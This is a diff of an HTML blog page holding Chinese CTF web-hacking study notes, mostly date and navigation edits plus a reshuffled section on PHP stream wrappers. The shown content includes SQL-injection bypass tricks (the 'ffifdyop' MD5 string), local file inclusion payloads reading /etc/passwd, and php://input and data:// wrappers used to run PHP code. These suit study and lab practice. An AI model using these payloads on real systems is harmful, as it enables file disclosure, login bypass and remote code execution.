@@ -10,7 +10,7 @@
   <meta name="description" content="为了就业方便，偶尔还是要学一学Web QAQ">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF——Web学习记录【长期更新】">
-<meta property="og:url" content="https://goodlunatic.github.io/2023/05/06/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/index.html">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/05/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/index.html">
 <meta property="og:site_name" content="Lunatic&#39;s Workstation">
 <meta property="og:description" content="为了就业方便，偶尔还是要学一学Web QAQ">
 <meta property="og:locale" content="en_US">
@@ -19,8 +19,8 @@
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975099603.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975192117.png!small">
 <meta property="og:image" content="https://image.3001.net/images/20180622/15295975369757.png!small">
-<meta property="article:published_time" content="2023-05-06T10:51:23.000Z">
-<meta property="article:modified_time" content="2023-05-06T11:01:48.358Z">
+<meta property="article:published_time" content="2023-05-09T10:51:23.000Z">
+<meta property="article:modified_time" content="2023-05-09T13:03:19.877Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="Web">
@@ -79,8 +79,8 @@
         <section id="main"><article id="post-CTF——Web学习记录【长期更新】" class="article article-type-post" itemscope
   itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2023/05/06/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" class="article-date">
-  <time datetime="2023-05-06T10:51:23.000Z" itemprop="datePublished">2023-05-06</time>
+    <a href="/2023/05/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" class="article-date">
+  <time datetime="2023-05-09T10:51:23.000Z" itemprop="datePublished">2023-05-09</time>
 </a>
     
   <div class="article-category">
@@ -112,7 +112,9 @@
       <p><strong>为了就业方便，偶尔还是要学一学Web QAQ</strong></p>
 <span id="more"></span>
 
-<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><h2 id="一、扫描网站目录"><a href="#一、扫描网站目录" class="headerlink" title="一、扫描网站目录"></a>一、扫描网站目录</h2><p>什么思路都没有的时候，可以用dirmap或者dirsearch扫一下网站目录，flag可能在phpinfo和.git里</p>
+<h1 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a>Tips:</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站目录的结构一般都是 /var/www/html/index.php 或者 /var/www/html/flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="一、扫描网站目录"><a href="#一、扫描网站目录" class="headerlink" title="一、扫描网站目录"></a>一、扫描网站目录</h2><p>什么思路都没有的时候，可以用dirmap或者dirsearch扫一下网站目录，flag可能在phpinfo和.git里</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/dirmap &amp;&amp; python dirmap.py -i http://1.14.71.254:28685 -lcf</span><br></pre></td></tr></table></figure>
 
 <h3 id="dirsearch使用详解"><a href="#dirsearch使用详解" class="headerlink" title="dirsearch使用详解"></a>dirsearch使用详解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-u 后面加目标url</span><br><span class="line">-e 包含的文件拓展名(逗号分隔)  如-e php,asp  </span><br><span class="line">-X 排除的文件拓展名(逗号分隔)  如-X asp,jsp</span><br><span class="line">-w 自定义字典</span><br><span class="line">-i 保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)</span><br><span class="line">-x 排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</span><br><span class="line">--timeout=TIMEOUT 连接超时时间</span><br><span class="line">-s DELAY, --delay=DELAY     每次请求间隔的时间</span><br><span class="line">--proxy=PROXY   			代理url 支持HTTP和SOCKS代理</span><br></pre></td></tr></table></figure>
@@ -314,13 +316,13 @@
 <h3 id="Tips-2"><a href="#Tips-2" class="headerlink" title="Tips:"></a>Tips:</h3><p>ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ <code>or &#39;6</code><br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password=’’ or ‘6xxxxx’，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>
 
-<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28686/?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="常见的php伪协议"><a href="#常见的php伪协议" class="headerlink" title="常见的php伪协议"></a>常见的php伪协议</h3><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用来读取本地的文件，当用于文件读取函数时可以用。</span><br><span class="line">常见检测是否存在漏洞写法：</span><br><span class="line">www.xxx.com/?file=file:///etc/passwd</span><br><span class="line">此协议不受allow_url_fopen,allow_url_include配置影响</span><br></pre></td></tr></table></figure>
+<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="常见的php伪协议"><a href="#常见的php伪协议" class="headerlink" title="常见的php伪协议"></a>常见的php伪协议</h3><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用来读取本地的文件，当用于文件读取函数时可以用。</span><br><span class="line">常见检测是否存在漏洞写法：</span><br><span class="line">www.xxx.com/?file=file:///etc/passwd</span><br><span class="line">此协议不受allow_url_fopen,allow_url_include配置影响</span><br></pre></td></tr></table></figure>
 
 <h4 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">此协议一般用于输入getshell的代码。</span><br><span class="line">www.xxx.xxx/?cmd=php://input</span><br><span class="line">然后用hackbar或者其他工具，postPHP代码进行检验，如</span><br><span class="line">&lt;?php&gt;phpinfo()?&gt;</span><br><span class="line">此协议受allow_url_include配置影响</span><br></pre></td></tr></table></figure>
 
 <h4 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一般用法如下</span><br><span class="line">www.xxx.xxx/?file=php://filter/convert.base64-encode/resource=useless.php</span><br><span class="line">出来的是base64编码过的内容，之后需要进行解码</span><br><span class="line">此协议不受allow_url_fopen,allow_url_include配置影响</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#base64编码后输出</span></span><br><span class="line">http://1.14.71.254:28686/?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>
 
 <h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">需要allow_url_fopen,allow_url_include均为on</span><br><span class="line">这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line">text/plain，表示的是文本</span><br><span class="line">text/plain;base64, 若纯文本没用可用base64编码</span><br></pre></td></tr></table></figure>
 
@@ -566,7 +568,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/05/06/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="clhg7j4j8000nv83zh4gyfy4a" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/05/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" data-id="clhh3dpg1000csc3z3gp86gu6" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
@@ -577,19 +579,19 @@
   
 <nav id="article-nav">
   
-    <a href="/2023/05/06/PHP%20Learning%20Record/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/05/10/Software%20Testing%20Learning/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          PHP Learning Record
+          Software Testing Learning
         
       </div>
     </a>
   
   
-    <a href="/2023/05/06/OWASP-Top10%E5%8F%8A%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2023/05/09/Java%20Learning%20Record/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">OWASP-Top10及靶场通关记录</div>
+      <div class="article-nav-title">Java Learning Record</div>
     </a>
   
 </nav>
@@ -624,7 +626,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -637,6 +639,14 @@
       <ul>
         
           <li>
+            <a href="/2023/05/10/Software%20Testing%20Learning/">Software Testing Learning</a>
+          </li>
+        
+          <li>
+            <a href="/2023/05/09/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web学习记录【长期更新】</a>
+          </li>
+        
+          <li>
             <a href="/2023/05/09/Java%20Learning%20Record/">Java Learning Record</a>
           </li>
         
@@ -645,15 +655,7 @@
           </li>
         
           <li>
-            <a href="/2023/05/06/CTF%E2%80%94%E2%80%94Web%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Web学习记录【长期更新】</a>
-          </li>
-        
-          <li>
             <a href="/2023/05/06/OWASP-Top10%E5%8F%8A%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/">OWASP-Top10及靶场通关记录</a>
-          </li>
-        
-          <li>
-            <a href="/2023/05/03/CTF%E2%80%94%E2%80%94Misc%E6%8C%87%E5%8D%97%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/">CTF——Misc指南【长期更新】</a>
           </li>
         
       </ul>
